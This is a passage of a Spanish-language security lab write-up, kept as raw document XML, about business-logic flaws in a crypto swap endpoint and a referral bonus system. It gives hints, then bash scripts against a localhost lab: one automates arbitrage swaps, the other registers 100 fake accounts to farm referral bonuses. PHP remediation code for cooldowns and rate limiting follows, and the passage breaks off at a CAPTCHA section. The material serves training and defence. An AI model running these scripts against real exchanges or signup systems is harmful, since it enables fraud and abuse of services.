        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Swap de criptomonedas</w:t>
      </w:r>
      <w:r>
        <w:t>: El endpoint de intercambio no implementa cooldown entre operaciones ni limites de frecuencia por usuario. Esto permite que un atacante ejecute un script automatizado que realice cientos de swaps por segundo, explotando diferencias de precio (arbitraje) antes de que el mercado se ajuste.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Sistema de referidos</w:t>
      </w:r>
      <w:r>
        <w:t>: El endpoint de registro otorga una bonificacion por cada cuenta nueva que use un codigo de referido. No existe validacion de unicidad de dispositivo, IP, ni CAPTCHA, lo que permite crear cientos de cuentas falsas con el mismo codigo de referido para acumular bonificaciones ilimitadas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/crypto/swap.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Intercambio de criptomonedas (sin cooldown ni rate limit)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/auth/register.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Registro de usuarios con sistema de referidos explotable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Media</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Requiere comprender la logica de negocio y escribir scripts de automatizacion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Reconocimiento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Realiza varias solicitudes de swap consecutivas y observa los tiempos de respuesta. ¿Existe algun delay o cooldown entre operaciones? ¿Hay algun header como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-RateLimit-Remaining</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en las respuestas?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - Identificacion del vector</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El endpoint de swap acepta operaciones sin ninguna pausa obligatoria. Puedes ejecutar un bucle con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o un script en Bash/Python que haga decenas de swaps por segundo. Ademas, el endpoint de registro no valida si multiples cuentas provienen de la misma IP o dispositivo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Explotacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Para el arbitraje: escribe un script que alterne entre comprar BTC con USDT y vender BTC por USDT en rapida sucesion, aprovechando que los precios no se actualizan entre operaciones. Para los referidos: automatiza el registro de cuentas usando un bucle, siempre con el mismo valor en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>referred_by</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 1: Arbitraje Automatizado mediante Swaps Rapidos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Autenticarse para obtener un token JWT valido.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TOKEN=$(curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"attacker@test.com","password":"password123"}' | \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  python -c "import sys,json; print(json.load(sys.stdin)['token'])")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Verificar que no existe cooldown realizando dos swaps consecutivos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Primer swap</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"USDT","to":"BTC","amount":100}'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Segundo swap inmediato (sin espera)</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"USDT","to":"BTC","amount":100}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Observar que ambas solicitudes se procesan sin error ni delay. No existe header </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-RateLimit-*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ni campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cooldown_remaining</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en la respuesta.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Ejecutar script de arbitraje automatizado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#!/bin/bash</w:t>
        <w:br/>
        <w:t># arbitrage.sh - Explota la ausencia de cooldown para arbitraje automatizado</w:t>
        <w:br/>
        <w:br/>
        <w:t>TOKEN="&lt;tu_token_jwt&gt;"</w:t>
        <w:br/>
        <w:t>BASE_URL="http://localhost/appsec/api/v1/crypto/swap.php"</w:t>
        <w:br/>
        <w:t>PROFIT_TOTAL=0</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "[*] Iniciando arbitraje automatizado..."</w:t>
        <w:br/>
        <w:br/>
        <w:t>for i in $(seq 1 50); do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Comprar BTC con USDT</w:t>
        <w:br/>
        <w:t xml:space="preserve">    RESP_BUY=$(curl -s -X POST "$BASE_URL" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -d '{"from":"USDT","to":"BTC","amount":1000}')</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    BTC_RECEIVED=$(echo "$RESP_BUY" | python -c "import sys,json; print(json.load(sys.stdin).get('received','0'))")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # Vender BTC inmediatamente por USDT</w:t>
        <w:br/>
        <w:t xml:space="preserve">    RESP_SELL=$(curl -s -X POST "$BASE_URL" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -d "{\"from\":\"BTC\",\"to\":\"USDT\",\"amount\":$BTC_RECEIVED}")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    USDT_RECEIVED=$(echo "$RESP_SELL" | python -c "import sys,json; print(json.load(sys.stdin).get('received','0'))")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    echo "[Ciclo $i] Invertido: 1000 USDT -&gt; Recibido: $BTC_RECEIVED BTC -&gt; Recibido: $USDT_RECEIVED USDT"</w:t>
        <w:br/>
        <w:t>done</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "[*] Arbitraje completado."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Resultado esperado</w:t>
      </w:r>
      <w:r>
        <w:t>: Cada ciclo de compra/venta genera una pequena ganancia debido a que los precios no se recalculan entre operaciones rapidas. En 50 ciclos, el beneficio acumulado es significativo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 2: Abuso del Sistema de Referidos con Cuentas Falsas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Crear una cuenta de atacante y obtener su codigo de referido.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/register.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "attacker_main",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "email": "attacker_main@test.com",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "password123"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 42,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "referral_code": "REF-ATTK42",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Cuenta creada exitosamente"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Verificar que el registro con referido otorga bonificacion sin restriccion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/register.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "username": "fake_user_1",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "email": "fake1@test.com",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "password": "password123",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "referred_by": "REF-ATTK42"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "user_id": 43,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "referral_bonus_applied": true,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "bonus_amount": "10 USDT",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Cuenta creada. Bono de referido aplicado al usuario REF-ATTK42"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Automatizar la creacion de cuentas falsas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#!/bin/bash</w:t>
        <w:br/>
        <w:t># referral_abuse.sh - Crea multiples cuentas falsas para acumular bonificaciones</w:t>
        <w:br/>
        <w:br/>
        <w:t>REFERRAL_CODE="REF-ATTK42"</w:t>
        <w:br/>
        <w:t>BASE_URL="http://localhost/appsec/api/v1/auth/register.php"</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "[*] Iniciando abuso de referidos..."</w:t>
        <w:br/>
        <w:br/>
        <w:t>for i in $(seq 1 100); do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    RESP=$(curl -s -X POST "$BASE_URL" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      -d "{</w:t>
        <w:br/>
        <w:t xml:space="preserve">        \"username\": \"bot_user_$i\",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        \"email\": \"bot${i}@disposable.com\",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        \"password\": \"pass${i}\",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        \"referred_by\": \"$REFERRAL_CODE\"</w:t>
        <w:br/>
        <w:t xml:space="preserve">      }")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    BONUS=$(echo "$RESP" | python -c "import sys,json; print(json.load(sys.stdin).get('bonus_amount','error'))" 2&gt;/dev/null)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "[Cuenta $i] Bono aplicado: $BONUS"</w:t>
        <w:br/>
        <w:t>done</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "[*] 100 cuentas creadas. Bono total acumulado: 1000 USDT en la cuenta principal."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Resultado esperado</w:t>
      </w:r>
      <w:r>
        <w:t>: Se crean 100 cuentas sin CAPTCHA, sin validacion de IP, y cada una otorga 10 USDT de bonificacion a la cuenta principal del atacante (total: 1000 USDT).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Implementar Cooldown entre Operaciones de Swap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// swap.php - Con cooldown entre operaciones</w:t>
        <w:br/>
        <w:br/>
        <w:t>$user_id = $decoded_token-&gt;sub;</w:t>
        <w:br/>
        <w:t>$cooldown_seconds = 30;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Verificar ultima operacion del usuario</w:t>
        <w:br/>
        <w:t>$stmt = $pdo-&gt;prepare(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "SELECT TIMESTAMPDIFF(SECOND, MAX(created_at), NOW()) as seconds_since_last</w:t>
        <w:br/>
        <w:t xml:space="preserve">     FROM swaps WHERE user_id = ?"</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute([$user_id]);</w:t>
        <w:br/>
        <w:t>$result = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</w:t>
        <w:br/>
        <w:br/>
        <w:t>if ($result['seconds_since_last'] !== null &amp;&amp; $result['seconds_since_last'] &lt; $cooldown_seconds) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $remaining = $cooldown_seconds - $result['seconds_since_last'];</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(429);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "error" =&gt; "Debe esperar entre operaciones",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "cooldown_remaining" =&gt; $remaining,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "retry_after" =&gt; $remaining</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Rate Limiting por Usuario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// middleware/rate_limit.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>function checkRateLimit(string $user_id, string $endpoint, int $max_requests, int $window_seconds): bool {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $redis = new Redis();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $redis-&gt;connect('127.0.0.1', 6379);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $key = "rate_limit:{$endpoint}:{$user_id}";</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $current = $redis-&gt;get($key);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if ($current !== false &amp;&amp; (int)$current &gt;= $max_requests) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        header("X-RateLimit-Limit: $max_requests");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        header("X-RateLimit-Remaining: 0");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        header("Retry-After: " . $redis-&gt;ttl($key));</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(429);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode(["error" =&gt; "Limite de solicitudes excedido"]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        exit;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $redis-&gt;incr($key);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if ($current === false) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $redis-&gt;expire($key, $window_seconds);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $remaining = $max_requests - ((int)$current + 1);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    header("X-RateLimit-Limit: $max_requests");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    header("X-RateLimit-Remaining: " . max(0, $remaining));</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    return true;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Uso en swap.php:</w:t>
        <w:br/>
        <w:t>checkRateLimit($user_id, "swap", 5, 60); // Maximo 5 swaps por minuto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. CAPTCHA en el Registro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
